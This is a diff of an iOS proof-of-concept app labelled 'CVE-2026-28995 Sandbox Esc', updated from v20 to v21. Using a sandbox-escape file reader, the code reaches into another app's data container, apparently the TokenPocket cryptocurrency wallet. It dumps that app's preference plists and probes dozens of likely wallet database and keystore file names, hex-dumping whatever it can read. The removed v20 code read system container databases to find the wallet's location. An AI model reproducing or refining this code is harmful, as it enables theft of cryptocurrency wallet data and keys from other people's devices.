@@ -1,4 +1,4 @@
-﻿//
+//
 //  ViewController.m
 //  TestPOC
 //
@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v20" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v21" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,139 +7376,133 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-    // Test 11: Read system databases to discover container UUIDs (v20)
-    [log appendString:@"\n--- Test 11: System DB approach (v20) ---\n"];
+    
+    // Test 11: Read TP config files to discover DB path (v21)
+    [log appendString:@"
+--- Test 11: Config file extraction (v21) ---
+"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // Helper: read binary file via sandbox escape
-    NSData *(^readBinary)(NSString*) = ^NSData *(NSString *subPath) {
-        NSString *p = TRYFILE(subPath);
-        return [NSData dataWithContentsOfFile:p];
-    };
-
-    // Helper: search binary data for patterns and extract UUIDs
-    void (^searchForUUIDs)(NSString*, NSString*, NSMutableString*) =
-    ^(NSString *filePath, NSString *label, NSMutableString *out) {
-        NSData *d = readBinary(filePath);
-        if (!d) { [out appendFormat:@"  [-] %@: not readable\n", label]; return; }
-        [out appendFormat:@"  [+] %@: %llu bytes\n", label, (unsigned long long)d.length];
-
-        // Search for TokenPocket bundle ID
-        NSData *bundlePattern = [@"com.global.wallet.ios" dataUsingEncoding:NSUTF8StringEncoding];
-        NSRange r = [d rangeOfData:bundlePattern options:0 range:NSMakeRange(0, d.length)];
-        if (r.location != NSNotFound) {
-            [out appendFormat:@"      Found 'com.global.wallet.ios' at offset %llu\n", (unsigned long long)r.location];
-            NSUInteger start = (NSUInteger)MAX(0, (NSInteger)r.location - 100);
-            NSUInteger len = MIN(300, d.length - start);
-            NSData *ctx = [d subdataWithRange:NSMakeRange(start, len)];
-            const unsigned char *bytes = ctx.bytes;
-            NSMutableString *hex = [NSMutableString string];
-            for (NSUInteger i = 0; i < ctx.length; i++) {
-                [hex appendFormat:@"%02x", bytes[i]];
-                if ((i+1) % 4 == 0) [hex appendString:@" "];
-                if ((i+1) % 32 == 0) [hex appendString:@"\n        "];
-            }
-            [out appendFormat:@"      Context hex:\n        %@\n", hex];
-
-            NSMutableString *ascii = [NSMutableString string];
-            for (NSUInteger i = 0; i < ctx.length; i++) {
-                unsigned char c = bytes[i];
-                [ascii appendFormat:@"%c", (c >= 0x20 && c < 0x7f) ? c : '.'];
-                if ((i+1) % 32 == 0) [ascii appendString:@"\n        "];
-            }
-            [out appendFormat:@"      Context ascii: %@\n", ascii];
-
-            // Extract UUID-like patterns
-            NSMutableSet *uuids = [NSMutableSet set];
-            for (NSUInteger i = 0; i + 36 <= d.length; i++) {
-                const unsigned char *b = (const unsigned char *)d.bytes + i;
-                if (b[8] == '-' && b[13] == '-' && b[18] == '-' && b[23] == '-') {
-                    NSString *candidate = [[NSString alloc] initWithBytes:b length:36 encoding:NSUTF8StringEncoding];
-                    if (candidate) [uuids addObject:candidate];
-                }
-            }
-            if (uuids.count > 0) {
-                [out appendFormat:@"      UUIDs found (%lu):\n", (unsigned long)uuids.count];
-                for (NSString *u in [uuids.allObjects sortedArrayUsingSelector:@selector(compare:)]) {
-                    [out appendFormat:@"        %@\n", u];
-                }
-            }
-        } else {
-            [out appendFormat:@"      'com.global.wallet.ios' NOT found\n"];
+    // Helper: read file, dump hex+ascii, deserialize plist, extract keys
+    void (^dumpFile)(NSString*, NSString*, NSMutableString*) =
+    ^(NSString *path, NSString *label, NSMutableString *out) {
+        NSString *p = TRYFILE(path);
+        NSData *d = [NSData dataWithContentsOfFile:p];
+        if (!d || d.length == 0) {
+            [out appendFormat:@"  [-] %@: %@
+", label, d ? @"empty" : @"not readable"];
+            return;
         }
-
-        // Search for App Group patterns
-        for (NSString *grp in @[@"group.com.tpwallet.wc", @"group.com.tp.wallet.wc", @"group.shared.tpwallet.internal"]) {
-            NSData *grpPat = [grp dataUsingEncoding:NSUTF8StringEncoding];
-            NSRange gr = [d rangeOfData:grpPat options:0 range:NSMakeRange(0, d.length)];
-            if (gr.location != NSNotFound) {
-                [out appendFormat:@"      Found '%@' at offset %llu\n", grp, (unsigned long long)gr.location];
-                NSUInteger gs = (NSUInteger)MAX(0, (NSInteger)gr.location - 50);
-                NSUInteger gl = MIN(200, d.length - gs);
-                NSData *gctx = [d subdataWithRange:NSMakeRange(gs, gl)];
-                const unsigned char *gb = gctx.bytes;
-                NSMutableString *gascii = [NSMutableString string];
-                for (NSUInteger i = 0; i < gctx.length; i++) {
-                    unsigned char c = gb[i];
-                    [gascii appendFormat:@"%c", (c >= 0x20 && c < 0x7f) ? c : '.'];
+        [out appendFormat:@"  [+] %@: %llu bytes
+", label, (unsigned long long)d.length];
+        const unsigned char *b = d.bytes;
+        BOOL isBinary = (d.length > 6 && memcmp(b, "bplist", 6) == 0);
+        BOOL isXML = (d.length > 5 && memcmp(b, "<?xml", 5) == 0);
+        BOOL isSQLite = (d.length > 16 && memcmp(b, "SQLite format 3 ", 16) == 0);
+        [out appendFormat:@"      magic: %s%s%s
+",
+            isBinary ? "bplist " : "", isXML ? "xml " : "", isSQLite ? "SQLITE " : ""];
+        if (isBinary || isXML) {
+            NSError *err = nil;
+            id plist = [NSPropertyListSerialization propertyListWithData:d
+                options:NSPropertyListImmutable format:nil error:&err];
+            if (plist) {
+                if ([plist isKindOfClass:[NSDictionary class]]) {
+                    [out appendFormat:@"      dict keys: %@
+",
+                        [[(NSDictionary*)plist allKeys] componentsJoinedByString:@", "]];
+                    // Dump full dict content
+                    for (NSString *k in [(NSDictionary*)plist allKeys]) {
+                        id v = [(NSDictionary*)plist objectForKey:k];
+                        NSString *vStr = [v isKindOfClass:[NSData class]]
+                            ? [NSString stringWithFormat:@"<data %lu bytes>", (unsigned long)[(NSData*)v length]]
+                            : [v description];
+                        if (vStr.length > 500) vStr = [[vStr substringToIndex:500] stringByAppendingString:@"..."];
+                        [out appendFormat:@"        [%@] = %@
+", k, vStr];
+                    }
+                } else if ([plist isKindOfClass:[NSArray class]]) {
+                    [out appendFormat:@"      array[%lu]: %@
+",
+                        (unsigned long)[(NSArray*)plist count],
+                        [[(NSArray*)plist subarrayWithRange:NSMakeRange(0, MIN(10, [(NSArray*)plist count]))] description]];
+                } else {
+                    [out appendFormat:@"      plist: %@ = %@
+",
+                        NSStringFromClass([plist class]), plist];
                 }
-                [out appendFormat:@"        ascii: %@\n", gascii];
+            } else {
+                [out appendFormat:@"      plist parse err: %@
+", err.localizedDescription];
             }
         }
+        NSUInteger dumpLen = MIN(256, d.length);
+        NSMutableString *hex = [NSMutableString stringWithString:@"      hex: "];
+        for (NSUInteger i = 0; i < dumpLen; i++) {
+            [hex appendFormat:@"%02x", b[i]];
+            if ((i + 1) % 64 == 0 && i + 1 < dumpLen) [hex appendString:@"
+           "];
+        }
+        [out appendFormat:@"%@
+", hex];
     };
 
-    // === v20 Step 1: Directory check ===
-    [log appendString:@"\n  [Step 1] Directory check:\n"];
-    for (NSString *f in @[
-        @"Documents/",@"Documents/db/",@"Library/",
-        @"Library/Application Support/",@"Library/Caches/",
-        @"Library/Preferences/",
-    ]) { probeFile([tpBase stringByAppendingPathComponent:f], log); }
+    // === Step 1: TP container config files ===
+    [log appendString:@"
+[Step 1] TP container config files:
+"];
+    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences.plist"],
+        @"Prefs.plist (Library root)", log);
+    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences/Preferences.plist"],
+        @"Prefs.plist (in Preferences/)", log);
+    dumpFile([tpBase stringByAppendingPathComponent:@"Library/Preferences/com.global.wallet.ios.plist"],
+        @"bundleID plist (in Prefs)", log);
 
-    // === v20 Step 2: Read applicationState.db ===
-    [log appendString:@"\n  [Step 2] applicationState.db (container UUID bplist blobs):\n"];
-    searchForUUIDs(@"var/mobile/Library/FrontBoard/applicationState.db", @"appState.db", log);
+    // === Step 2: System CFPreferences plists ===
+    [log appendString:@"
+[Step 2] System CFPreferences plists:
+"];
+    dumpFile(@"var/mobile/Library/Preferences/com.global.wallet.ios.plist",
+        @"/var/mobile/Library/Preferences/com.global.wallet.ios.plist", log);
+    dumpFile(@"var/mobile/Library/Preferences/group.com.tpwallet.wc.plist",
+        @"group.com.tpwallet.wc plist", log);
+    dumpFile(@"var/mobile/Library/Preferences/group.com.tp.wallet.wc.plist",
+        @"group.com.tp.wallet.wc plist", log);
+    dumpFile(@"var/mobile/Library/Preferences/Global_Wallet.plist",
+        @"Global_Wallet.plist", log);
 
-    // === v20 Step 3: Read MobileContainerManager DB ===
-    [log appendString:@"\n  [Step 3] MobileContainerManager containers.sqlite3:\n"];
-    searchForUUIDs(@"var/root/Library/MobileContainerManager/containers.sqlite3", @"containers.sqlite3", log);
-
-    // === v20 Step 4: Alternative containermanagerd paths ===
-    [log appendString:@"\n  [Step 4] Alternative container manager paths:\n"];
-    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/", log);
-    searchForUUIDs(@"var/mobile/Library/Caches/com.apple.containermanagerd/Data/containers.sqlite3", @"alt-containers", log);
-
-    // === v20 Step 5: Read our OWN metadata plist first (to verify the approach) ===
-    [log appendString:@"\n  [Step 5] Our own data container metadata:\n"];
-    NSString *ourUUID = @"E4D6B061-CE33-4060-A28A-0CBDF81EF639";
-    probeFile([NSString stringWithFormat:
-        @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", ourUUID], log);
-
-    // === v20 Step 6: Verify TP container data ===
-    [log appendString:@"\n  [Step 6] TP container metadata check:\n"];
-    probeFile([tpBase stringByAppendingPathComponent:
-        @".com.apple.mobile_container_manager.metadata.plist"], log);
-
-    // === v20 Step 7: Final targeted DB probe ===
-    [log appendString:@"\n  [Step 7] Final DB probe in all TP dirs:\n"];
-    NSArray *dirs = @[@"Documents/",@"Documents/db/",@"Library/",
-        @"Library/Application Support/",@"Library/Caches/"];
-    NSArray *names = @[@"wallet",@"tp",@"data",@"app",@"main",@"default",
-        @"global",@"Global_Wallet",@"TPWallet",@"tokenpocket",@"keypal",
-        @"hdwallet",@"storage",@"cache",@"tokens",@"accounts",@"keystore",
-        @"WalletDB",@"HDWalletDB",@"KeyPalWalletDB",@"KeyPalDB"];
-    NSArray *exts = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",
-        @".dat",@".realm",@".json",@".plist",@".data",@".bin",@""];
-    for (NSString *dir in dirs) {
-        for (NSString *name in names) {
-            for (NSString *ext in exts) {
+    // === Step 3: TP Library targeted file probing ===
+    [log appendString:@"
+[Step 3] TP Library targeted probing:
+"];
+    NSArray *v21subdirs = @[@"Library/", @"Library/Preferences/", @"Library/Caches/", @"Documents/db/"];
+    NSArray *v21names = @[@"Preferences", @"Config", @"AppConfig", @"db_config",
+        @"Global_Wallet", @"wallet_data", @"wallet_config",
+        @"com.global.wallet.ios", @"tokenpocket", @"Settings",
+        @"app_config", @"localData", @"AppData", @"db_info", @"KeyPal",
+        @"hdwallet", @"Store", @"wallet", @"appdata", @"keypal_config",
+        @"TPMain", @"TPWallet", @"UserData", @"CacheData", @"Global_Wallet.sqlite",
+        @"Global_Wallet.db", @"Global_Wallet.encrypted", @"Global_Wallet.sqlcipher",
+        @"walletdb", @"WalletDB", @"HDWalletDB", @"KeyPalDB", @"KeyPalWalletDB"];
+    NSArray *v21exts = @[@".plist", @".json", @".data", @".bin", @".xml", @".sqlite",
+        @".db", @".sqlite3", @".encrypted", @".sqlcipher", @".dat", @".cfg", @""];
+    for (NSString *sd in v21subdirs) {
+        for (NSString *nm in v21names) {
+            for (NSString *ex in v21exts) {
                 probeFile([tpBase stringByAppendingPathComponent:
-                    [NSString stringWithFormat:@"%@%@%@", dir, name, ext]], log);
+                    [NSString stringWithFormat:@"%@%@%@", sd, nm, ex]], log);
             }
         }
     }
+
+    // === Step 4: Read TP bundle Info.plist ===
+    [log appendString:@"
+[Step 4] TP bundle Info.plist:
+"];
+    dumpFile(@"var/containers/Bundle/Application/97028E76-0192-4651-BF43-3BFCAC8D9BA9/Global Wallet.app/Info.plist",
+        @"TP Info.plist", log);
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
